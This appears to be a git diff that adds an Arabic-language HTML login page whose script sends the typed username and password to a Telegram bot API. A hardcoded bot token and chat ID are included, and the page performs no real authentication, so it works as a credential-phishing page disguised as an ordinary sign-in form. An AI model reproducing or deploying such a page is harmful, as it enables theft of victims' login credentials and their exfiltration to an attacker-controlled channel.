@@ -1,0 +1,77 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل الدخول</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    form {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 300px;
+    }
+    input {
+      width: 100%;
+      margin: 10px 0;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #0088cc;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <form id="loginForm">
+    <h2 style="text-align:center;">تسجيل الدخول</h2>
+    <input type="text" id="username" placeholder="اسم المستخدم" required>
+    <input type="password" id="password" placeholder="كلمة المرور" required>
+    <button type="submit">دخول</button>
+  </form>
+
+  <script>
+    const token = "5163782415:AAFUXonHYPD2An7hUr0e-dziATUqf20Vh8g";
+    const chat_id = "1006215595";
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const text = `🚪 محاولة تسجيل دخول:\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text })
+      }).then(res => {
+        if (res.ok) {
+          alert("✅ تم الإرسال إلى البوت!");
+        } else {
+          alert("❌ حدث خطأ بالإرسال.");
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
